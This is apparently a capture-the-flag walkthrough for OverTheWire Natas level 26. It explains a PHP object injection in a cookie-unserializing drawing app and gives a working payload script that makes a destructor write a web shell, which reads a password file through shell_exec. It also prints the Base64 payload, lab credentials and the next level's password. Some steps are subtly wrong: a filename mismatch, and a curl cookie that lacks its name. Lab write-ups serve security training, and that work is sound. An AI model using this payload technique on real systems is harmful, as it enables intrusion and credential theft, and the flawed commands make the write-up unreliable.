# Natas Level 26

> Username: natas26

> Password: 3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT

> URL: http://natas26.natas.labs.overthewire.org

## Solution

Entering the URL, we found the web lets you submit two `X,Y` pairs to draw lines. So let's view the source code to see if there is vulnerabilities.

```php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```

Reading the code help us understanding the weaknesses, that leads to the vulnerability.

```php
function __destruct(){
	// write exit message
	$fd=fopen($this->logFile,"a+");
	fwrite($fd,$this->exitMsg);
	fclose($fd);
}
```

PHP automatically calls `__destruct()` when an object is destroyed, usually when the script finishes or the object is no longer referenced.
It writes something to a file whose path is stored in `$logFile`.

And the main weakness in the code is:

```php
$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```

The application reads the `drawing` cookie. -> It Base64-decodes its contents. -> It unserializes the result. -> PHP reconstructs whatever data or objects were serialized.

So the vulnerability is that the application expects an array, but it doesn't verify that the deserialized data is actually an array of drawing coordinates.
We can exploit that lack of validation to introduce an object with dangerous magic methods.
This vulnerability is called `PHP Object Injection`.

Now let's creating our payload.

```shell
nano natas26
```

```php
<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
}

// Create an object without running its constructor.
$logger = new Logger();

$reflection = new ReflectionClass('Logger');

$logFile = $reflection->getProperty('logFile');
$initMsg = $reflection->getProperty('initMsg');
$exitMsg = $reflection->getProperty('exitMsg');

$logFile->setAccessible(true);
$initMsg->setAccessible(true);
$exitMsg->setAccessible(true);

$logFile->setValue($logger, 'img/shell.php');
$initMsg->setValue($logger, '');
$exitMsg->setValue(
    $logger,
    "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>"
);

// The Logger object MUST be inside an array.
$payload = array($logger);

// Serialize and Base64 encode.
echo base64_encode(serialize($payload));
?>
```

What the payload does:
1/ The destructor opens `img/shell.php`.
2/ It writes our PHP code into that file.
3/ The web server can execute the PHP file when we visit it.
4/ The PHP code reads the password for Natas27.

So we run it and get the malicious Base64 string.

```shell
php natas26.php
```

```text
YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL3NoZWxsLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjU5OiI8P3BocCBlY2hvIHNoZWxsX2V4ZWMoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fX0=
```

Now you add it by Inspecting the page -> Application -> Cookie. Then change the drawing value by the malicious Base64 we create.
After refreshing the page, browse http://natas26.natas.labs.overthewire.org/img/shell.php to find the password for the next level.

Also you can use `curl` easily:

```shell
curl 'http://natas26.natas.labs.overthewire.org/img/shell.php' -u 'natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT' --cookie 'YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL3NoZWxsLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjU5OiI8P3BocCBlY2hvIHNoZWxsX2V4ZWMoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fX0='
```

```text
mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV
```

